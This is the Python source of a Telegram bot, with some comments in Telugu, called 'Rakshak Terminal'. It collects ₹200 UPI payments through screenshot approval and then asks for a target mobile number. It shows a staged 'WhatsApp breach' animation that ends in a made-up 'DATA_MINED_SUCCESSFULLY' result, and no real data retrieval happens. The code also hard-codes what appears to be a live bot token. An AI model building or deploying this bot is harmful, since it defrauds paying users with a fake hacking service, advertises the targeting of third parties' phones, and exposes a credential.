import asyncio
import os
import random
import string
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# --- CONFIG ---
TOKEN = "8615286526:AAEX65kXROmTVafC7ttG0LrGOstLIiLTQJ0"
PORT = int(os.environ.get("PORT", 10000))
ADMIN_ID = 7978913926  # మీ పర్మనెంట్ అడ్మిన్ ఐడి

# --- DATABASE (In-memory) ---
db = {
    "upi_id": "Not Set",
    "upi_qr_file_id": None,
    "approved_users": set()
}

GLITCH_CHARS = ["!", "@", "#", "$", "%", "^", "&", "*", "Ø", "Σ", "▒", "▓", "░", "☣️", "☢️", "⚡"]

# --- UTILS ---
def get_glitch_line(length=25):
    """Generate a random glitchy looking text string"""
    return "".join(random.choices(GLITCH_CHARS + list(string.ascii_uppercase), k=length))

# --- WEB SERVER (For Deployment Health Checks) ---
async def start_web_server():
    server = web.Application()
    server.router.add_get("/", lambda r: web.Response(text="Terminal Online 🛡️"))
    runner = web.AppRunner(server)
    await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", PORT).start()

# --- HANDLERS ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # 1. ADMIN AUTOMATIC ACCESS
    if user_id == ADMIN_ID:
        kb = [
            [InlineKeyboardButton("🆔 Set UPI ID", callback_data='admin_set_upi')],
            [InlineKeyboardButton("🖼 Upload QR Code", callback_data='admin_set_qr')],
            [InlineKeyboardButton("⚡ START TERMINAL", callback_data='start_attack')]
        ]
        await update.message.reply_text(
            "🔓 <b>WELCOME COMMANDER</b>\n<code>STATUS: ROOT_ACCESS_GRANTED</code>\nAdmin Panel Active.",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML"
        )
        return

    # 2. USER ACCESS CONTROL (Payment Check)
    if user_id not in db["approved_users"]:
        pay_text = (
            "🚫 <b>ACCESS RESTRICTED</b>\n"
            "<code>------------------------</code>\n"
            "🛡️ <b>OFFICER RAKSHAK TERMINAL</b>\n"
            "Amount to Pay: <b>₹200</b>\n"
            f"UPI ID: <code>{db['upi_id']}</code>\n"
            "<code>------------------------</code>\n"
            "👇 <b>Pay చేసి Screenshot ఇక్కడే పంపండి.</b>\n"
            f"Your ID: <code>{user_id}</code>"
        )
        if db["upi_qr_file_id"]:
            await update.message.reply_photo(photo=db["upi_qr_file_id"], caption=pay_text, parse_mode="HTML")
        else:
            await update.message.reply_text(pay_text, parse_mode="HTML")
        return

    # 3. APPROVED USER UI
    keyboard = [[InlineKeyboardButton("⚡ INITIALIZE BREACH", callback_data='start_attack')]]
    await update.message.reply_text(
        "<b>[RAKSHAK TERMINAL]</b>\n<code>STATUS: AUTHENTICATED_USER</code>",
        reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML"
    )

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Admin Uploading QR
    if user_id == ADMIN_ID and context.user_data.get('admin_state') == 'SET_QR':
        db["upi_qr_file_id"] = update.message.photo[-1].file_id
        context.user_data['admin_state'] = None
        return await update.message.reply_text("✅ <b>SYSTEM QR UPDATED SUCCESSFULLY</b>", parse_mode="HTML")

    # User Sending Payment Screenshot
    if user_id != ADMIN_ID and user_id not in db["approved_users"]:
        # Admin కి పంపడం
        kb = [[InlineKeyboardButton("✅ Approve", callback_data=f"appr_{user_id}"),
               InlineKeyboardButton("❌ Decline", callback_data=f"decl_{user_id}")]]
        await context.bot.send_photo(
            chat_id=ADMIN_ID,
            photo=update.message.photo[-1].file_id,
            caption=f"💰 <b>NEW PAYMENT RECEIVED</b>\nUser ID: <code>{user_id}</code>\nName: {update.effective_user.first_name}",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML"
        )
        await update.message.reply_text("⏳ <b>SCREENSHOT RECEIVED</b>\nVerifying with Admin... Please wait.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    await query.answer()

    # Admin Panel Functions
    if data == 'admin_set_upi':
        await query.edit_message_text("⌨️ <b>మీ UPI ID ని టైప్ చేసి పంపండి:</b>", parse_mode="HTML")
        context.user_data['admin_state'] = 'SET_UPI'
    elif data == 'admin_set_qr':
        await query.edit_message_text("🖼 <b>QR Code ఫోటోని అప్‌లోడ్ చేయండి:</b>", parse_mode="HTML")
        context.user_data['admin_state'] = 'SET_QR'
    
    # Approval Logic
    elif data.startswith("appr_"):
        target_uid = int(data.split("_")[1])
        db["approved_users"].add(target_uid)
        await query.edit_message_caption("✅ <b>USER_APPROVED_SUCCESSFULLY</b>")
        await context.bot.send_message(target_uid, "🚀 <b>ACCESS GRANTED!</b>\n/start క్లిక్ చేసి టెర్మినల్ ఉపయోగించండి.", parse_mode="HTML")
    
    elif data.startswith("decl_"):
        target_uid = int(data.split("_")[1])
        await query.edit_message_caption("❌ <b>PAYMENT_DECLINED</b>")
        await context.bot.send_message(target_uid, "❌ <b>PAYMENT REJECTED</b>\nసరిగ్గా పే చేసి స్క్రీన్‌షాట్ పంపండి.")

    # Start Attack Function
    elif data == 'start_attack':
        await query.edit_message_text("📡 <b>TARGET_ACQUISITION</b>\n<code>Enter Mobile Number (With Country Code):</code>", parse_mode="HTML")
        context.user_data['state'] = 'WAITING_FOR_NUM'

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # Admin UPI Update
    if user_id == ADMIN_ID and context.user_data.get('admin_state') == 'SET_UPI':
        db["upi_id"] = text
        context.user_data['admin_state'] = None
        return await update.message.reply_text(f"✅ UPI set to: <code>{db['upi_id']}</code>", parse_mode="HTML")

    # User Breach Input
    if context.user_data.get('state') == 'WAITING_FOR_NUM':
        clean_num = text.replace("+", "")
        
        # Validation: Only digits, length 10-15
        if not clean_num.isdigit() or not (10 <= len(clean_num) <= 15):
            await update.message.reply_text("❌ <b>NO DATA FOUND</b>\n<code>Invalid Mobile Number format. Use numbers only.</code>", parse_mode="HTML")
            return

        context.user_data['state'] = None
        msg = await update.message.reply_text("<code>[SYSTEM] INITIALIZING EXPLOIT...</code>", parse_mode="HTML")
        
        # 1. Progress Bar Animation
        for i in range(0, 101, 20):
            bar = "█" * (i // 10) + "░" * (10 - (i // 10))
            await msg.edit_text(f"<b>TARGET: {clean_num}</b>\n<code>INJECTING: [{bar}] {i}%</code>", parse_mode="HTML")
            await asyncio.sleep(0.4)
        
        # 2. Fast Flicker Glitch
        for _ in range(12):
            await msg.edit_text(f"<code>{get_glitch_line(25)}\nBYPASSING_WHATSAPP_SECURITY</code>", parse_mode="HTML")
            await asyncio.sleep(0.08)
            
        # 3. Final API Result
        final_ui = (
            "✅ <b>BREACH SUCCESSFUL</b>\n"
            f"<code>------------------------</code>\n"
            f"<b>Endpoint:</b> <code>org.whatsapp.com/getdetails/{clean_num}</code>\n"
            "<b>Status:</b> <code>DATA_MINED_SUCCESSFULLY</code>\n"
            f"<code>------------------------</code>"
        )
        await msg.edit_text(final_ui, parse_mode="HTML")

async def main():
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_text))
    
    await app.initialize()
    await app.start()
    
    print("RAKSHAK TERMINAL ONLINE 🚀")
    
    # Web server and Polling parallel ga run cheyyడం
    await asyncio.gather(
        start_web_server(),
        app.updater.start_polling(),
        asyncio.Event().wait()
    )

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
